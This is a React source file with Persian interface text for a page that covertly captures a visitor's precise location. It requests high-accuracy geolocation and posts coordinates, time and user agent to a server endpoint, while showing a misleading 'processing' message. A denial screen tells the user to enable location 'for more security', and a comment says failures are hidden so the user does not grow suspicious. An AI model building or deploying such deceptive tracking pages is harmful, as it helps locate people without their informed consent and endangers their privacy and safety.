// src/App.jsx
import { useEffect, useState } from 'react';
import './App.css';

function App() {
  const [phase, setPhase] = useState('loading'); // loading → requesting → done / denied

  useEffect(() => {
    // ۱ ثانیه صبر + اسپینر
    const timer = setTimeout(() => {
      setPhase('requesting');

      if (!navigator.geolocation) {
        setPhase('error');
        return;
      }

      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const data = {
            lat: position.coords.latitude,
            lng: position.coords.longitude,
            accuracy: Math.round(position.coords.accuracy),
            time: new Date(position.timestamp).toISOString(),
            ua: navigator.userAgent.substring(0, 100),
          };

          setPhase('sent');

          try {
            const res = await fetch('/api/send-location', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(data),
            });

            if (!res.ok) throw new Error('ارسال نشد');
          } catch (err) {
            console.error(err);
            // حتی اگر ارسال نشه، به کاربر چیزی نشون نمیدیم که مشکوک نشه
          }
        },
        (err) => {
          setPhase('denied');
        },
        {
          enableHighAccuracy: true,
          timeout: 12000,
          maximumAge: 0,
        }
      );
    }, 1000);

    return () => clearTimeout(timer);
  }, []);

  return (
    <div className="phone-screen">
      {phase === 'loading' && (
        <div className="spinner-container">
          <div className="spinner"></div>
          <div className="loading-text">یه لحظه...</div>
        </div>
      )}

      {phase === 'requesting' && (
        <div className="requesting">
          <div className="small-spinner"></div>
          <p>در حال گرفتن اطلاعات از سمت سرور</p>
        </div>
      )}

      {phase === 'sent' && (
        <div className="success">
          <div className="checkmark">✓</div>
          <p>پردازش با موفقیت انجام شد</p>
        </div>
      )}

      {phase === 'denied' && (
        <div className="denied">
          <p>برای امنیت بیشتر لطفا مکان دستگاه خود را روشن کرده و مجددا اقدام فرمایید</p>
        </div>
      )}

      {phase === 'error' && (
        <div className="error">
          <p>مشکلی پیش آمد</p>
        </div>
      )}
    </div>
  );
}

export default App;